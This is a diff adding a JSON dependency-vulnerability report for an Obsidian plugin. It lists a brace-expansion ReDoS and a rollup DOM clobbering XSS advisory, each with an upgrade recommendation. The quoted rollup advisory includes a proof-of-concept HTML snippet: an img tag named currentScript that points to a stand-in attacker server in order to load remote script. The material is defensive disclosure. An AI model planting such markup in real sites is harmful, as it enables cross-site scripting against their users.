@@ -1,0 +1,233 @@
+{
+  "analyzedAt": "2025-12-17T20:07:22.075Z",
+  "source": "zolrath__obsidian-auto-link-title.osv.json",
+  "summary": {
+    "totalVulnerabilities": 2,
+    "uniqueVulnerabilities": 2,
+    "affectedPackages": 2,
+    "stalePackages": 2,
+    "stalePackagesOldFix": 2,
+    "severityBreakdown": {
+      "CRITICAL": 0,
+      "HIGH": 0,
+      "MEDIUM": 0,
+      "LOW": 2
+    },
+    "recentVulnerabilities": 0,
+    "hasFixAvailable": 2
+  },
+  "vulnerabilities": [
+    {
+      "id": "GHSA-v6h2-p8h4-qcjw",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-5889"
+      ],
+      "summary": "brace-expansion Regular Expression Denial of Service vulnerability",
+      "details": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
+      "cwes": [
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-06-09T21:30:51Z",
+        "modifiedDate": "2025-06-11T20:54:10Z",
+        "daysSincePublished": 190
+      },
+      "affected": {
+        "package": "brace-expansion",
+        "version": "1.1.11",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.1.11",
+        "fixedIn": "2.0.2",
+        "recommendation": "Upgrade to 2.0.2 or later",
+        "fixAvailableSince": "2025-06-11T20:54:10.000Z",
+        "daysSinceFix": 188,
+        "monthsSinceFix": 6,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5889"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217"
+        },
+        {
+          "type": "WEB",
+          "url": "https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/juliangruber/brace-expansion"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?ctiid.311660"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?id.311660"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?submit.585717"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-gcx4-mw62-g8wm",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-47068"
+      ],
+      "summary": "DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS",
+      "details": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nIt's worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n#### Gadget found in `rollup`\n\nWe have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.\n\n```\nvar s = document.createElement('script')\ns.src = import.meta.url + 'extra.js'\ndocument.head.append(s)\n```\n\nThe output `bundle.js` is shown in the following code snippet.\n\n```\n'use strict';\n\nvar _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;\nvar s = document.createElement('script');\ns.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';\ndocument.head.append(s);\n```\n\nAdding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>rollup Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script type=\"module\" crossorigin src=\"bundle.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.\n\n### Patch\n\nPatching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.\n\n```\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n\tgetResolveUrl(\n\t\t`'${escapeId(relativePath)}', ${\n\t\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t\t}document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`\n\t);\n```\n\n```\nconst getUrlFromDocument = (chunkId: string, umd = false) =>\n\t`${\n\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(\n\t\tchunkId\n\t)}', document.baseURI).href)`;\n```\n",
+      "cwes": [
+        {
+          "id": "CWE-79",
+          "name": "Cross-Site Scripting (XSS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-09-23T22:11:02Z",
+        "modifiedDate": "2024-09-26T21:11:53Z",
+        "daysSincePublished": 449
+      },
+      "affected": {
+        "package": "rollup",
+        "version": "2.79.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "2.79.1",
+        "fixedIn": "3.29.5",
+        "recommendation": "Upgrade to 3.29.5 or later",
+        "fixAvailableSince": "2024-09-26T21:11:53.000Z",
+        "daysSinceFix": 446,
+        "monthsSinceFix": 14,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47068"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/rollup/rollup"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185"
+        }
+      ]
+    }
+  ],
+  "staleDependencies": [
+    {
+      "package": "brace-expansion",
+      "currentVersion": "1.1.11",
+      "fixedIn": "2.0.2",
+      "vulnerabilities": [
+        "GHSA-v6h2-p8h4-qcjw"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 2.0.2 or later",
+      "fixAvailableSince": "2025-06-11T20:54:10.000Z",
+      "daysSinceFix": 188,
+      "monthsSinceFix": 6,
+      "isOldFix": true
+    },
+    {
+      "package": "rollup",
+      "currentVersion": "2.79.1",
+      "fixedIn": "3.29.5",
+      "vulnerabilities": [
+        "GHSA-gcx4-mw62-g8wm"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 3.29.5 or later",
+      "fixAvailableSince": "2024-09-26T21:11:53.000Z",
+      "daysSinceFix": 446,
+      "monthsSinceFix": 14,
+      "isOldFix": true
+    }
+  ],
+  "recommendations": [
+    {
+      "priority": "HIGH",
+      "message": "2 packages have fixes available for >6 months. Update urgently!"
+    },
+    {
+      "priority": "MEDIUM",
+      "message": "2 packages have known vulnerabilities with available fixes. Update recommended."
+    }
+  ]
+}
